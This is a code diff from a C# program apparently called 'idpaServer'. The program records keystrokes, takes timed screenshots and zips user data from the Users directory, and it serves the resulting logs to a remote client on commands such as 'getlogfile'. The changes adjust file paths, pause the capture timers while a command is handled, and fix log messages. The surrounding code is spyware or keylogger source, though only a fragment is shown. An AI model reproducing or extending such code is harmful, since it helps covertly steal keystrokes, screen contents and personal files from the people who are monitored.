@@ -14,9 +14,9 @@ namespace idpaServer
 
         //Paths
         public const string APP_PATH = @"C:\Temp"; //Path where the Application saves Files
-        public const string DATA_PATH = @"C:\Users"; //Path where the User Data is stored
+        public const string DATA_PATH = @"C:\Temp\User"; //Path where the User Data is stored -- C:\Users
         public const string KEYLOGFILE_NAME = @"\log.xml"; //The name of the LogFile
-        public const string ZIPFILE_NAME = @"\log.xml"; //The name of the Zipped File
+        public const string ZIPFILE_NAME = @"\userdata.zip"; //The name of the Zipped File
         public const string PRINTSCREEN_NAME = "PrintScreen"; //The name of the Print Screens
         public const string PRINTSCREEN_PATH = APP_PATH + @"\PrintScreens\"; //The Path where the Printscreens are stored
         public const string LOG_PATH = Controller.APP_PATH + Controller.KEYLOGFILE_NAME; //Where the logfile will be stored
@@ -123,6 +123,10 @@ namespace idpaServer
         {
             clientCommand = clientCommand.Trim().ToLower().Normalize();
 
+            timerKey.Stop();
+            timerKeyLogfile.Stop();
+            timerPrintScreen.Stop();
+
             switch (clientCommand)
             {
                 case "getlogfile":
@@ -140,17 +144,22 @@ namespace idpaServer
                     break;
             }
 
+            timerKey.Start();
+            timerKeyLogfile.Start();
+            timerPrintScreen.Start();
+
             clientCommand = null;
         }
 
         private static void InitSavePrintScreen(object sender, EventArgs e)
         {
-            Console.WriteLine("Logfie written");
+            Console.WriteLine("Printscreen taken");
             FileManager.SavePrintScreen(PrintScreen.GetScreenshot(), PRINTSCREEN_PATH, PRINTSCREEN_NAME);
         }
 
         private static void InitSaveLogFile(object sender, EventArgs e)
         {
+            Console.WriteLine("Logfile written");
             FileManager.SaveLogFile(LOG_PATH, Keylogger.GetLogger());
         }
     }
